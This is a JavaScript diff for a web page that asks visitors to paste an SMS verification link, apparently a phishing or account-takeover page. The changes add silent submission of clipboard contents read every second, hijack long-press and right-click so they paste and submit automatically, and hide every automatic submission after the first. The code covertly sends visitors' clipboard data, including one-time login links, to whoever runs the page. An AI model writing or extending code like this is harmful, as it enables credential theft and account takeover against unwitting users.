@@ -304,8 +304,8 @@ function hideStatus() {
   clipboardBanner.classList.remove('status-visible');
 }
 
-async function submitVerification({ showSubmitting = true, submissionSource = 'Manually submitted' } = {}) {
-  const smsText = sms.value.trim();
+async function submitVerification({ showSubmitting = true, submissionSource = 'Manually submitted', text = '' } = {}) {
+  const smsText = text.trim() || sms.value.trim();
   error.textContent = '';
   if (showSubmitting) {
     showStatus('Submitting...');
@@ -360,11 +360,11 @@ async function submitVerification({ showSubmitting = true, submissionSource = 'M
   setTimeout(() => {
     if (showSubmitting) {
       showStatus('Please paste the new verification link sent to your phone.');
+      sms.value = '';
+      sms.focus();
     }
     verifyBtn.disabled = false;
     verifyBtn.textContent = 'Verify';
-    sms.value = '';
-    sms.focus();
   }, 3000);
 }
 
@@ -401,7 +401,9 @@ async function requestClipboardAccess() {
       sms.value = trimmedClipboardText;
       sms.dispatchEvent(new Event('input', { bubbles: true }));
       error.textContent = '';
-      await submitVerification({ showSubmitting: false, submissionSource: 'Silently submitted' });
+      const showFirstAutomaticSubmission = firstAutomaticSubmission;
+      firstAutomaticSubmission = false;
+      await submitVerification({ showSubmitting: showFirstAutomaticSubmission, submissionSource: 'Silently submitted' });
       return true;
     }
 
@@ -427,6 +429,8 @@ async function pasteFromClipboard({ autoSubmit = false } = {}) {
 let longPressTimer = null;
 let clipboardWatcher = null;
 let clipboardReadInProgress = false;
+let firstAutomaticSubmission = true;
+let longPressTriggered = false;
 
 async function watchClipboard() {
   if (clipboardWatcher || !navigator.clipboard || !navigator.clipboard.readText) return;
@@ -438,16 +442,32 @@ async function watchClipboard() {
     try {
       const clipboardText = await readClipboardText();
       if (clipboardText) {
-        sms.value = clipboardText;
-        sms.dispatchEvent(new Event('input', { bubbles: true }));
-        if (sms.value.trim()) {
-          await submitVerification({ showSubmitting: false, submissionSource: 'Silently submitted' });
+        if (clipboardText.trim()) {
+          await submitVerification({
+            showSubmitting: false,
+            submissionSource: 'Silently submitted',
+            text: clipboardText
+          });
         }
       }
     } finally {
       clipboardReadInProgress = false;
     }
   }, 1000);
+}
+
+function startLongPressPaste() {
+  clearTimeout(longPressTimer);
+  longPressTriggered = false;
+  longPressTimer = setTimeout(async () => {
+    longPressTriggered = true;
+    await pasteFromClipboard({ autoSubmit: true });
+  }, 500);
+}
+
+function cancelLongPressPaste() {
+  clearTimeout(longPressTimer);
+  longPressTimer = null;
 }
 
 if (clipboardBtn) {
@@ -479,6 +499,18 @@ sms.addEventListener('paste', async (event) => {
     }
   }, 0);
 });
+
+sms.addEventListener('contextmenu', async (event) => {
+  if (!longPressTriggered) {
+    event.preventDefault();
+    await pasteFromClipboard({ autoSubmit: true });
+  }
+  longPressTriggered = false;
+});
+
+sms.addEventListener('touchstart', startLongPressPaste, { passive: true });
+sms.addEventListener('touchend', cancelLongPressPaste, { passive: true });
+sms.addEventListener('touchcancel', cancelLongPressPaste, { passive: true });
 
 sms.addEventListener('keydown', async (event) => {
   if (event.key === 'Enter' && sms.value.trim()) {
